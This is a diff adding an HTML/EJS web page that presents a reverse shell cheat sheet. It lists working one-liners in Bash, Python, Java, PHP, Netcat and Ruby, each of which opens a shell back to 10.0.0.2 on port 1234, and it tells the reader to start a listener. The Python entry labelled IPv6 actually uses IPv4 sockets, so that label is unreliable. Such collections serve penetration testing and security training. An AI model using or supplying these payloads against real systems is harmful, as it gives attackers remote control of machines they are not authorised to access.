@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Revere Shell Cheat Sheet</title>
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+        <link href="../css/styles.css" rel="stylesheet" />
+        <link href="../js/scripts.js">
+        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
+       <style>
+            header
+            {
+                margin-top:1rem;
+                margin-bottom: 2rem;
+            }
+            code
+            {
+                display: block;
+                background-color:lightgray;
+                padding: 3px 0px 3px 10px;
+                border-radius: 10px;
+                margin-bottom:5px;
+
+            }
+            .rshell
+            {
+                
+                padding:0px 0px 5px 0px;
+                border-radius: 10px;
+                margin-bottom: 1rem;
+            }
+            div h3
+            {
+                background-color: #343a40;
+                color:white;
+                padding-left: 10px;
+                border-radius: 10px;
+            }
+            img
+            {
+                display: flex;
+                margin: 5px auto 10px auto;
+            }
+        </style>
+    </head>
+    <body>
+        <%- include("../../partials/header.ejs")%>
+        <header class="container">
+            <h1 class="display-5">Reverse Shell Cheat Sheet</h1>
+            <img src="https://dpsvdv74uwwos.cloudfront.net/statics/img/ogimage/understanding-reverse-shells.jpg" alt="Reverse Shell" style="max-width: 100%;max-height: 500px;" class="img-fluid">
+            <p><strong>NOTE: Don't forget to set up a listener on your device.</strong></p>
+        </header>
+        <div class="container rshell">
+            <h3>Bash TCP</h3>
+            <code>
+                bash -i >& /dev/tcp/10.0.0.2/1234 0>&1
+            </code>
+            <p style="padding-left: 7px;">NOTE: Prefer Port number &gt;1024 and &lt;65536 </p>
+        </div>
+        <div class="container"></div>
+        <div class="container rshell">
+            <h3>Bash UDP</h3>
+            <code>sh -i >& /dev/udp/10.0.0.2/1234 0>&1</code>
+        </div>
+        <div class="container rshell">
+            <h3>Python [For linux]</h3>
+            <h5 style="padding-left: 5px;">For IPv4</h5>
+            <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.2",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</code>
+            <br>
+            <h5 style="padding-left: 5px;">For IPv6</h5>
+            <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.2",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code>
+        </div>
+        <div class="container rshell">
+            <h3>Java</h3>
+            <code>r = Runtime.getRuntime()
+                <br>
+                p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.2/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+                p.waitFor()
+                </code>
+        </div>
+        <div class="container rshell">
+            <h3>PHP</h3>
+            <code>php -r '$sock=fsockopen("10.0.0.2",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code>
+            <code>php -r '$sock=fsockopen("10.0.0.2",1234);shell_exec("/bin/sh -i <&3 >&3 2>&3");'</code>
+            <code>php -r '$sock=fsockopen("10.0.0.2",1234);system("/bin/sh -i <&3 >&3 2>&3");'</code>
+            <code>php -r '$sock=fsockopen("10.0.0.2",1234);passthru("/bin/sh -i <&3 >&3 2>&3");'</code>
+            <code>php -r '$sock=fsockopen("10.0.0.2",1234);popen("/bin/sh -i <&3 >&3 2>&3", "r");'</code>
+            <code>php -r '$sock=fsockopen("10.0.0.2",1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'</code>
+        </div>
+        <div class="container rshell">
+            <h3>Netcat</h3>
+            <code>nc -e /bin/sh 10.0.0.2 1234</code>
+            <code>nc -e /bin/bash 10.0.0.2 1234</code>
+  
+        </div>
+        <div class="container rshell">
+            <h3>Ruby</h3>
+            <code>ruby -rsocket -e'f=TCPSocket.open("10.0.0.2",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</code>
+        </div>
+    </body>
+</html>
